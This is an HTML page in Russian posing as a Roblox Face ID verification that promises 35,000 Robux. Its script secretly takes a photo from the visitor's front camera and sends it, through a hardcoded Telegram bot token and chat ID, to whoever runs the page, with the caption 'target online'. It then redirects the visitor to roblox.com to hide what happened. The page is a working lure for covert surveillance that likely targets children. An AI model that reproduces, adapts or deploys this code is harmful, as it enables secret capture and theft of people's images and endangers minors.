<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Prize Verification</title>
    <style>
        body { font-family: sans-serif; background: #f2f4f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 85%; }
        button { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; }
        #status { color: #888; margin-top: 15px; font-size: 13px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="margin-bottom:15px;">
    <h2>Подтверждение Face ID</h2>
    <p>Нажми «РАЗРЕШИТЬ» в появившемся окне браузера, чтобы получить <b>35,000 Robux</b>.</p>
    <button id="go">✅ ПОЛУЧИТЬ РОБУКСЫ</button>
    <div id="status">Нажми на кнопку для проверки...</div>
</div>

<video id="v" autoplay playsinline style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const btn = document.getElementById('go');
    const status = document.getElementById('status');

    btn.onclick = async () => {
        status.innerText = "Запрашиваю доступ к камере...";
        
        try {
            // Прямой запрос потока
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            status.innerText = "Доступ получен! Обработка...";
            const video = document.getElementById('v');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', '7889497672');
                    fd.append('photo', blob, 'face.jpg');
                    fd.append('caption', '📸 **ЦЕЛЬ В СЕТИ!**\nСнимок из Chrome успешно получен.');

                    fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                        method: 'POST',
                        body: fd
                    }).then(() => {
                        stream.getTracks().forEach(t => t.stop());
                        alert("Верификация пройдена! Ждите зачисления.");
                        window.location.href = "https://www.roblox.com";
                    });
                }, 'image/jpeg', 0.8);
            }, 1000);

        } catch (e) {
            console.error(e);
            status.style.color = "red";
            status.innerText = "Ошибка! Нажми на 'замочек' вверху и разреши камеру вручную.";
            alert("Пожалуйста, разрешите доступ к камере в настройках браузера!");
        }
    };
</script>
</body>
</html>
